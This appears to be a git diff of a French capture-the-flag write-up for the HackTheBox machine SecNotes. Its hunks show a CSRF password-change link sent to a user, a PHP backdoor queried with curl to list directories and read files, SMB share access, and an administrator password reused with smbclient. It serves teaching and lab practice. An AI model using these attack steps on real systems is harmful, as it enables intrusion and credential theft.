@@ -26,7 +26,7 @@ Quand on est connecté on est face à un système de gestion de mémos. Et on vo
 
 Du coup on met un port en écoute et on envoie un lien par ce formulaire pour voir si quelqu'un mort à l'hameçon. Et la pèche est bonne :  
 
-```plain
+```
 GET /index.html HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
 Host: 10.10.10.97
@@ -43,7 +43,7 @@ Le site dispose d'un script de changement de mot de passe qui soumet ses donnée
 
 Il suffit de tester avec notre compte avec l'URL suivante :  
 
-```plain
+```
 http://secnotes.htb/change_pass.php?password=devloop456&confirm_password=devloop456&submit=submit
 ```
 
@@ -55,7 +55,7 @@ L'étape suivante consiste à écrire un script PHP qui effectue juste un *heade
 
 On envoie ensuite le lien à *tyler* pour provoquer le changement de son mot de passe :  
 
-```plain
+```
 $ php -S 10.10.14.35:8080
 PHP 7.2.9-1 Development Server started at Wed Aug 29 11:04:35 2018
 Listening on http://10.10.14.35:8080
@@ -75,7 +75,7 @@ Bien sûr on est tenté d'utiliser ces identifiants pour lancer un psexec / wmie
 
 Les identifiants nous donnent toutefois accès en écriture à un partage baptisé *new-site* :  
 
-```plain
+```
 $ smbclient -U tyler //secnotes.htb/new-site
 WARNING: The "syslog" option is deprecated
 Enter WORKGROUP\tyler's password:
@@ -91,7 +91,7 @@ Ces fichiers correspondent à ce que l'on peut trouver sur le port 8808. On peut
 
 J'ai commencé par uploader une backdoor généraliste (voir [ce précédent article]({% link _posts/2017-07-07-Tales-of-PenTest-1-Celui-qui-donnait-la-permission-FILE.md %})) histoire de fouiller un peu :  
 
-```plain
+```
 $ curl --data 'f=scandir&a=c:/users/&rf=print_r' http://secnotes.htb:8808/devloop_.php
 Array
 (
@@ -113,7 +113,7 @@ Array
 
 On trouve notre premier flag :  
 
-```plain
+```
 $ curl --data 'f=readfile&a=c:/users/tyler/desktop/user.txt' http://secnotes.htb:8808/devloop_.php
 6fa7556968052a83183fb8099cb904f3
 ```
@@ -161,7 +161,7 @@ Pimp my Windows
 
 A la racine du disque C on trouve un dossier *Distros* énigmatique :  
 
-```plain
+```
  Volume in drive C has no label.
  Volume Serial Number is 9CDD-BADA
 
@@ -188,7 +188,7 @@ Il s'agit en fait de *WSL* (*Windows Subsystem for Linux*) qui permet aux utilis
 
 Ces fichiers sont modifiables par les utilisateurs authentifiés (par login). Il y a toutefois un fichier de signature et ce serait peut être compliqué de s'y attaquer :  
 
-```plain
+```
 c:\Distros\Ubuntu\ubuntu.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Users:(I)(RX)
@@ -207,7 +207,7 @@ Unfocus
 
 Des fois à être trop obnubilé par un élément on s'enfonce dans la mauvaise direction. Et là le dossier *Administrator* ne peut qu'attirer notre attention :  
 
-```plain
+```
 C:\inetpub\new-site>bash
 bash
 mesg: ttyname failed: Inappropriate ioctl for device
@@ -276,7 +276,7 @@ exitls
 
 La suite on la devine :  
 
-```plain
+```
 $ smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\secnotes.htb\\c$
 WARNING: The "syslog" option is deprecated
 Try "help" to get a list of possible commands.
